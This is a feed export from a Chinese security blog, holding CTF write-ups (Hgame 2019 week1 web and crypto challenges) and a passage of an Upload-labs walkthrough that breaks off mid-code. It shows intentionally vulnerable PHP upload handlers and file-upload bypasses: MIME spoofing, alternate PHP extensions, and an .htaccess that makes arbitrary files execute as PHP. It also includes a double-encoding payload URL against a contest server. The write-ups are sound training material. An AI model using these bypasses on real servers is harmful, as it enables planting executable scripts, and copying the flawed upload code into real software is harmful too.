rel="noopener">飘零学长wp</a>，</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="键盘之争"><a href="#键盘之争" class="headerlink" title="键盘之争"></a>键盘之争</h3><p>百度到键盘之争：</p><p><img src="https://s2.ax1x.com/2019/02/24/k4vEff.png" alt="k4vEff.png"></p><p>对应到的键盘如下：</p><p><img src="https://s2.ax1x.com/2019/02/24/k4vM0s.png" alt="k4vM0s.png"></p><p>写个对应的列表，替换对应的字符，解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">dic_1=[<span class="string">'q'</span>,<span class="string">'w'</span>,<span class="string">'e'</span>,<span class="string">'r'</span>,<span class="string">'t'</span>,<span class="string">'y'</span>,<span class="string">'u'</span>,<span class="string">'i'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'a'</span>,<span class="string">'s'</span>,<span class="string">'d'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">';'</span>,<span class="string">'"'</span>,<span class="string">'z'</span>,<span class="string">'x'</span>,<span class="string">'c'</span>,<span class="string">'v'</span>,<span class="string">'b'</span>,<span class="string">'n'</span>,<span class="string">'m'</span>,<span class="string">'+'</span>,<span class="string">'_'</span>]</span><br><span class="line">dic_2=[<span class="string">'"'</span>,<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>,<span class="string">'p'</span>,<span class="string">'y'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'c'</span>,<span class="string">'r'</span>,<span class="string">'l'</span>,<span class="string">'a'</span>,<span class="string">'o'</span>,<span class="string">'e'</span>,<span class="string">'u'</span>,<span class="string">'i'</span>,<span class="string">'d'</span>,<span class="string">'h'</span>,<span class="string">'t'</span>,<span class="string">'n'</span>,<span class="string">'s'</span>,<span class="string">'_'</span>,<span class="string">';'</span>,<span class="string">'q'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'x'</span>,<span class="string">'b'</span>,<span class="string">'m'</span>,<span class="string">'&#125;'</span>,<span class="string">'&#123;'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    res=<span class="string">''</span></span><br><span class="line">    str0=<span class="string">'ypau_kjg;"g;"ypau+'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str0:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> dic_1:</span><br><span class="line">            num=dic_1.index(i)</span><br><span class="line">            res+=dic_2[num]</span><br><span class="line">    <span class="keyword">print</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>得到flag：</p><p><a href="https://imgchr.com/i/k4x65q" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/24/k4x65q.md.png" alt="k4x65q.md.png"></a></p><p>​                                                                         </p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;未完待续…
    
    </summary>
    
      <category term="Writeup" scheme="https://gardenia30.top/categories/Writeup/"/>
    
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
      <category term="Writeup" scheme="https://gardenia30.top/tags/Writeup/"/>
    
      <category term="CTF" scheme="https://gardenia30.top/tags/CTF/"/>
    
      <category term="Crypto" scheme="https://gardenia30.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>杭电Hgame-2019-week1-WP</title>
    <link href="https://gardenia30.top/2019/02/19/%E6%9D%AD%E7%94%B5HGAME-WEEK1-WP/"/>
    <id>https://gardenia30.top/2019/02/19/杭电HGAME-WEEK1-WP/</id>
    <published>2019-02-19T12:18:14.000Z</published>
    <updated>2019-03-03T08:03:58.357Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次ak了web…是入门的week1，对，像我这种萌新最喜欢做这种题(手动滑稽脸)；<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="谁吃了我的flag"><a href="#谁吃了我的flag" class="headerlink" title="谁吃了我的flag"></a>谁吃了我的flag</h3><p>题目提示：vim，没好好关机，知道了是Linux的vim异常退出；</p><p>于是尝试访问<code>.index.html.swp</code>，成功下载swp文件，拖进十六进制编辑器查看得到flag：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0X9Sg.png" alt="k0X9Sg.png"></p><h3 id="换头大作战"><a href="#换头大作战" class="headerlink" title="换头大作战"></a>换头大作战</h3><p>如下界面：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0XM6J.png" alt="k0XM6J.png"></p><p>随便输入了内容提交得到提示：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0XYtK.png" alt="k0XYtK.png"></p><p>提示需要POST，那就hackbar直接post一个值：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0Xd6H.png" alt="k0Xd6H.png"></p><p>又来提示需要本地登录，那就加上<code>X-Forwarded-For</code>的请求头：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0jnEt.png" alt="k0jnEt.png"></p><p>提示需要修改<code>User-Agent</code>，那就直接修改：</p><p><a href="https://imgchr.com/i/k0jwCT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0jwCT.md.png" alt="k0jwCT.md.png"></a></p><p>又要求<code>the requests should referer from www.bilibili.com</code>，继续添加：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0jB2F.png" alt="k0jB2F.png"></p><p>要求是管理员登录…有点无从下手，想了一下既然是换头大作战…查看请求头发现Cookie里有admin=0关键字，索性直接修改为1，payload如下：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0jR56.png" alt="k0jR56.png"></p><p>得到flag：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0jLIP.png" alt="k0jLIP.png"></p><h3 id="very-easy-web"><a href="#very-easy-web" class="headerlink" title="very easy web"></a>very easy web</h3><p>代码审计初体验：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strpos(<span class="string">"vidar"</span>,$_GET[<span class="string">'id'</span>])!==<span class="keyword">FALSE</span>)</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"&lt;p&gt;干巴爹&lt;/p&gt;"</span>);</span><br><span class="line"></span><br><span class="line">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]);</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'id'</span>] === <span class="string">"vidar"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>非常简单的url二次编码绕过，GET进来的id已经被urldecode一次了，代码意思是继续decode得到<code>vidar</code>；</p><p><strong>payload:</strong><code>http://120.78.184.111:8080/week1/very_ez/index.php?id=%2576%2569%2564%2561%2572</code></p><h3 id="can-u-find-me"><a href="#can-u-find-me" class="headerlink" title="can u find me?"></a>can u find me?</h3><p>查看源代码有提示：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0xfje.png" alt="k0xfje.png"></p><p>查看响应头：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0x7Nt.png" alt="k0x7Nt.png"></p><p>于是直接post一个password过去：</p><p><a href="https://imgchr.com/i/k0zC40" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0zC40.md.png" alt="k0zC40.md.png"></a></p><p>点进去…说太快了：</p><p><a href="https://imgchr.com/i/k0zF3T" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0zF3T.md.png" alt="k0zF3T.md.png"></a></p><p>那就抓个包试试…得到flag：</p><p><a href="https://imgchr.com/i/k0zkgU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0zkgU.md.png" alt="k0zkgU.md.png"></a></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Mix"><a href="#Mix" class="headerlink" title="Mix"></a>Mix</h3><blockquote><p>Description:</p><p>–…/….-/….-/-…/–…/…–/…../..-./-…./-../-…./..-./–…/—-./….-/….-/–…/.—-/-…./-…/–…/-…/-…./..—/…../.—-/-…./-…./…–/….-/…–/—–/-…./…../–…/-.. So easy</p></blockquote><p>看起来就是摩斯密码没错了，找个在线解密即可得到16进制，解码得到字符，凯撒移位后观察关键字母，栅栏移位即可得到flag；</p><h3 id="base全家"><a href="#base全家" class="headerlink" title="base全家"></a>base全家</h3><p><a href="https://imgchr.com/i/ko86FH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/26/ko86FH.md.png" alt="ko86FH.md.png"></a></p><p>我就不说了…呆了，解半天也没想到个好办法，python跑一下，既然是base全家桶系列，直接用异常处理即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f=open(<span class="string">'cnm.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">p=f.read()</span><br><span class="line">n=<span class="string">''</span></span><br><span class="line">step=[]</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        n=base64.b16decode(p)</span><br><span class="line">        <span class="keyword">print</span> n</span><br><span class="line">        p=n</span><br><span class="line">        step.append(<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        n=base64.b32decode(p)</span><br><span class="line">        <span class="keyword">print</span> n</span><br><span class="line">        p=n</span><br><span class="line">        step.append(<span class="number">32</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        n=base64.b64decode(p)</span><br><span class="line">        <span class="keyword">print</span> n</span><br><span class="line">        p=n</span><br><span class="line">        step.append(<span class="number">64</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> step</span><br></pre></td></tr></table></figure><p>python渣渣就不班门弄斧了…就是要注意base解码的顺序，必须从<code>16-&gt;32-&gt;64</code>，原因是部分base16和base32可以被base64解码…找到有意义的字符串如下：</p><p><a href="https://imgchr.com/i/koYhOx" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/26/koYhOx.md.png" alt="koYhOx.md.png"></a></p><p>在线base58解密即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;40ca78cde14458da697066eb4cc7daf6&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;第一次ak了web…是入门的week1，对，像我这种萌新最喜欢做这种题(手动滑稽脸)；
    
    </summary>
    
      <category term="Writeup" scheme="https://gardenia30.top/categories/Writeup/"/>
    
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
      <category term="Writeup" scheme="https://gardenia30.top/tags/Writeup/"/>
    
      <category term="Crypto" scheme="https://gardenia30.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>Upload-labs通关笔记</title>
    <link href="https://gardenia30.top/2019/02/19/Upload-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
    <id>https://gardenia30.top/2019/02/19/Upload-labs通关笔记/</id>
    <published>2019-02-19T12:16:10.000Z</published>
    <updated>2019-04-09T09:29:29.263Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>从打完校赛开始到现在，身为萌新，寒假就研究了一下文件上传这部分内容，还是自己动手实践一下比较好，还可以学学代码审计；<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h2><p>任何客户端验证都是不安全的，客户端验证只能用来防止用户输入错误，减少服务器的开销，服务器端验证才可以真正抵御攻击者；</p><h3 id="pass-01-js验证"><a href="#pass-01-js验证" class="headerlink" title="pass-01-js验证"></a>pass-01-js验证</h3><p>php为后缀的文件上传不了，发现前端的javascript验证；</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">            alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">        <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">        <span class="comment">//提取上传文件的类型</span></span><br><span class="line">        <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">        <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">        <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">            alert(errMsg);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如此一来就很简单了，直接禁用js即可上传可解析的脚本文件；还有很多方法，先将脚本文件改为可以上传的后缀名，如<code>less1.jpg</code>，然后bp截取修改后缀为脚本文件的类型上传即可；</p><p>上传成功后如下直接可以访问；</p><p><a href="https://imgchr.com/i/kaLoSs" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/11/kaLoSs.png" alt="kaLoSs.png"></a></p><h2 id="服务端校验"><a href="#服务端校验" class="headerlink" title="服务端校验"></a>服务端校验</h2><h3 id="pass-02-MIME验证"><a href="#pass-02-MIME验证" class="headerlink" title="pass-02-MIME验证"></a>pass-02-MIME验证</h3><p>黑盒情况下上传<code>gardenia.jpg</code>，bp截取后修改后缀为可执行脚本后缀<code>.php</code>可以直接上传成功，访问成功；</p><p><a href="https://imgchr.com/i/kaO8AS" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/11/kaO8AS.png" alt="kaO8AS.png"></a></p><p>审计一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现了关键的判断是对<code>type</code>的判断，由此想到是对文件MIME类型进行验证；</p><p>上面的黑盒条件下的尝试也是偶然的巧合，因为刚开始的脚本被改成了<code>.jpg</code>为后缀，所以bp截包所看见的MIME检测到的类型就理所当然是<code>image/jpeg</code>，所以在这样的情况下将<code>.jpg</code>修改为<code>.php</code>就可以上传成功；</p><p><a href="https://imgchr.com/i/kavVtU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/11/kavVtU.png" alt="kavVtU.png"></a></p><p>正确的姿势如下：</p><p>上传<code>.php</code>文件，截包，发现MIME类型如下：</p><p><a href="https://imgchr.com/i/kavGtO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/11/kavGtO.png" alt="kavGtO.png"></a></p><p>修改<code>Content-Type</code>为代码中pass的类型即可：</p><p><a href="https://imgchr.com/i/kavHCF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/11/kavHCF.png" alt="kavHCF.png"></a></p><p>上传成功：</p><p><img src="https://s2.ax1x.com/2019/02/11/kaxVbt.png" alt="kaxVbt.png"></p><h3 id="pass-03-上传特殊可解析后缀"><a href="#pass-03-上传特殊可解析后缀" class="headerlink" title="pass-03-上传特殊可解析后缀"></a>pass-03-上传特殊可解析后缀</h3><p><strong>solution1</strong></p><p>黑盒情况下上传<code>.php</code>文件得到提示：不允许上传.asp .aspx .php .jsp后缀文件！猜测应该是设置了黑名单；于是尝试上传<code>.php5</code>为后缀的文件，上传成功并且成功回显访问路径；</p><p><img src="https://s2.ax1x.com/2019/02/11/kaxIsA.png" alt="kaxIsA.png"></p><p>但奇怪的是<code>php5</code>无法被服务器解析，经Google得知是apache服务器配置的问题，在<code>httpd.conf</code>文件中查看是否有如下语句，如果没有，添加即可；</p><p><code>AddType application/x-httpd-php .php .phtml .php5 .phps .php3 .pht</code></p><p><a href="https://imgchr.com/i/kaz0Ff" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/11/kaz0Ff.png" alt="kaz0Ff.png"></a></p><p>审计源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);<span class="comment">//黑名单</span></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显是设置了黑名单的<code>$deny_ext = array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);</code>而且其中将文件名进行了改写，所以访问文件的时候路径需要注意；</p><p><strong>solution2</strong></p><p>如果发现上传<code>.php5,.phtml,.pht</code>一类无法解析，就可以尝试使用<code>.htaccess</code>；见pass-04；</p><h3 id="pass-04-上传-htaccess"><a href="#pass-04-上传-htaccess" class="headerlink" title="pass-04-上传.htaccess"></a>pass-04-上传.htaccess</h3><p>这题在黑盒情况下测试pass-03的多数情况都是不可以的，查看一下源码：</p><p><code>$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);</code></p><p>发现黑名单过滤了几乎所有的我了解到的特殊后缀，唯独没有过滤<code>.htaccess</code>，所以可以通过上传此文件达到重写文件解析，前提是apache的配置文件conf里有这样配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride All</span><br><span class="line">LoadModule rewrite_module modules/mod_rewrite.so</span><br></pre></td></tr></table></figure><p>于是创建<code>.htaccess</code>文件内容如下，上传，用于解析指定路径里指定文件名的文件为php脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;gardenia&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>此时创建文件名为<code>gardenia</code>的php脚本文件，无需后缀名，上传即可解析为php脚本；</p><p>解析成功：</p><p><img src="https://s2.ax1x.com/2019/02/12/kwhR2V.png" alt="kwhR2V.png"></p><h3 id="pass-05-大小写绕过"><a href="#pass-05-大小写绕过" class="headerlink" title="pass-05-大小写绕过"></a>pass-05-大小写绕过</h3><p>在黑盒情况下，发现无法上传.htaccess文件和其他特殊后缀，查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span 